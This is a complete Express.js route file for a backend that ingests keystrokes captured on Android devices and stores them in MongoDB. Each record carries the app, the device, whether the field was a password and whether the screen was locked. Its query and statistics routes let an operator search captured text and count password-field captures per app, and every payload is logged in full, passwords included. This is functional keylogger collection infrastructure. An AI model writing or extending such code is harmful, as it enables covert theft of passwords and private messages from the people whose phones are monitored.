const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');

// POST /api/text-inputs - Save text input
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        // Log full payload received
        console.log('📩 Received text-input payload:', JSON.stringify(req.body, null, 2));
        
        const {
            id,
            timestamp,
            packageName,
            appName,
            deviceId,
            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
            keyboardInput,
            inputField,
            inputType,
            // CONTEXT INFORMATION (MINIMAL)
            screenTitle,
            fieldHint,
            isPassword,
            isScreenLocked,
            // APP CONTEXT (MINIMAL)
            activityName,
            viewId,
            // DEVICE INFO (MINIMAL)
            deviceModel,
            androidVersion
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !keyboardInput || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, keyboardInput, deviceId'
            });
        }

        // Sanitize data to prevent MongoDB validation errors
        const sanitizeValue = (value) => {
            if (value === null || value === undefined) return null;
            if (typeof value === 'object') {
                try {
                    return JSON.parse(JSON.stringify(value));
                } catch (e) {
                    return String(value);
                }
            }
            return value;
        };

        // Create text input data matching the simplified keyboard input model
        const incoming = {
            id: sanitizeValue(id),
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            packageName: sanitizeValue(packageName),
            appName: sanitizeValue(appName),
            deviceId: sanitizeValue(deviceId),
            
            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
            keyboardInput: sanitizeValue(keyboardInput) || '',
            inputField: sanitizeValue(inputField) || 'text_input',
            inputType: sanitizeValue(inputType) || 'text',
            
            // CONTEXT INFORMATION (MINIMAL)
            screenTitle: sanitizeValue(screenTitle) || null,
            fieldHint: sanitizeValue(fieldHint) || null,
            isPassword: isPassword || false,
            isScreenLocked: isScreenLocked || false,
            
            // APP CONTEXT (MINIMAL)
            activityName: sanitizeValue(activityName) || '',
            viewId: sanitizeValue(viewId) || '',
            
            // DEVICE INFO (MINIMAL)
            deviceModel: sanitizeValue(deviceModel) || '',
            androidVersion: sanitizeValue(androidVersion) || ''
        };

        console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));

        // Preserve longest keyboardInput per id to avoid overwriting full input with partials
        const existing = await TextInput.findOne({ id: incoming.id }).lean();
        if (existing) {
            const existingInputLen = (existing.keyboardInput || '').length;
            const incomingInputLen = (incoming.keyboardInput || '').length;
            if (incomingInputLen < existingInputLen) {
                console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
                incoming.keyboardInput = existing.keyboardInput;
            }
        }

        // Upsert
        const result = await TextInput.findOneAndUpdate(
            { id: incoming.id },
            { $set: incoming, $setOnInsert: { createdAt: new Date() } },
            { upsert: true, new: true, runValidators: true }
        );

        console.log('✅ Text input saved:', result.id);

        res.status(200).json({
            success: true,
            message: 'Keyboard input saved successfully',
            data: {
                id: result._id,
                textInputId: result.id,
                keyboardInput: result.keyboardInput,
                inputField: result.inputField,
                inputType: result.inputType,
                packageName: result.packageName,
                appName: result.appName,
                timestamp: result.timestamp
            }
        });

    } catch (error) {
        console.error('❌ Error saving text input:', error);
        
        // Handle specific MongoDB validation errors
        if (error.name === 'ValidationError') {
            const validationErrors = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                message: 'Validation error',
                errors: validationErrors
            });
        }
        
        // Handle duplicate key errors
        if (error.code === 11000) {
            return res.status(409).json({
                success: false,
                message: 'Text input already exists',
                duplicateKey: error.keyValue
            });
        }
        
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs - Get all text inputs
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const { 
            page = 1, 
            limit = 50, 
            packageName, 
            deviceId, 
            startDate, 
            endDate,
            isPassword,
            inputType,
            search 
        } = req.query;

        // Build filter object
        const filter = {};
        
        if (packageName) filter.packageName = packageName;
        if (deviceId) filter.deviceId = deviceId;
        if (isPassword !== undefined) filter.isPassword = isPassword === 'true';
        if (inputType) filter.inputType = inputType;
        
        // Date range filter
        if (startDate || endDate) {
            filter.timestamp = {};
            if (startDate) filter.timestamp.$gte = new Date(startDate);
            if (endDate) filter.timestamp.$lte = new Date(endDate);
        }
        
        // Text search
        if (search) {
            filter.$or = [
                { keyboardInput: { $regex: search, $options: 'i' } },
                { inputField: { $regex: search, $options: 'i' } },
                { screenTitle: { $regex: search, $options: 'i' } },
                { fieldHint: { $regex: search, $options: 'i' } }
            ];
        }

        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);
        const skip = (pageNum - 1) * limitNum;

        const textInputs = await TextInput.find(filter)
            .sort({ timestamp: -1 })
            .skip(skip)
            .limit(limitNum)
            .lean();

        const total = await TextInput.countDocuments(filter);

        res.status(200).json({
            success: true,
            data: {
                textInputs,
                pagination: {
                    page: pageNum,
                    limit: limitNum,
                    total,
                    pages: Math.ceil(total / limitNum)
                }
            }
        });

    } catch (error) {
        console.error('Error fetching text inputs:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs/stats - Get statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName, startDate, endDate } = req.query;

        // Build filter object
        const filter = {};
        if (deviceId) filter.deviceId = deviceId;
        if (packageName) filter.packageName = packageName;
        
        // Date range filter
        if (startDate || endDate) {
            filter.timestamp = {};
            if (startDate) filter.timestamp.$gte = new Date(startDate);
            if (endDate) filter.timestamp.$lte = new Date(endDate);
        }

        const stats = await TextInput.aggregate([
            { $match: filter },
            {
                $group: {
                    _id: null,
                    totalKeyboardInputs: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' },
                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } },
                    inputTypes: { $addToSet: '$inputType' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalKeyboardInputs: 1,
                    uniqueApps: { $size: '$uniqueApps' },
                    uniqueDevices: { $size: '$uniqueDevices' },
                    passwordFields: 1,
                    avgInputLength: { $round: ['$avgInputLength', 2] },
                    inputTypes: { $size: '$inputTypes' }
                }
            }
        ]);

        // Get app breakdown
        const appBreakdown = await TextInput.aggregate([
            { $match: filter },
            {
                $group: {
                    _id: '$packageName',
                    count: { $sum: 1 },
                    appName: { $first: '$appName' },
                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } }
                }
            },
            { $sort: { count: -1 } },
            { $limit: 10 }
        ]);

        res.status(200).json({
            success: true,
            data: {
                stats: stats[0] || {
                    totalKeyboardInputs: 0,
                    uniqueApps: 0,
                    uniqueDevices: 0,
                    passwordFields: 0,
                    avgInputLength: 0,
                    inputTypes: 0
                },
                appBreakdown
            }
        });

    } catch (error) {
        console.error('Error fetching text input stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs/:id - Get specific text input
router.get('/:id', authenticateApiKey, async (req, res) => {
    try {
        const textInput = await TextInput.findOne({ id: req.params.id });
        
        if (!textInput) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        res.status(200).json({
            success: true,
            data: textInput
        });

    } catch (error) {
        console.error('Error fetching text input:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// DELETE /api/text-inputs/:id - Delete specific text input
router.delete('/:id', authenticateApiKey, async (req, res) => {
    try {
        const result = await TextInput.findOneAndDelete({ id: req.params.id });
        
        if (!result) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        res.status(200).json({
            success: true,
            message: 'Text input deleted successfully',
            data: { id: result._id }
        });

    } catch (error) {
        console.error('Error deleting text input:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

module.exports = router;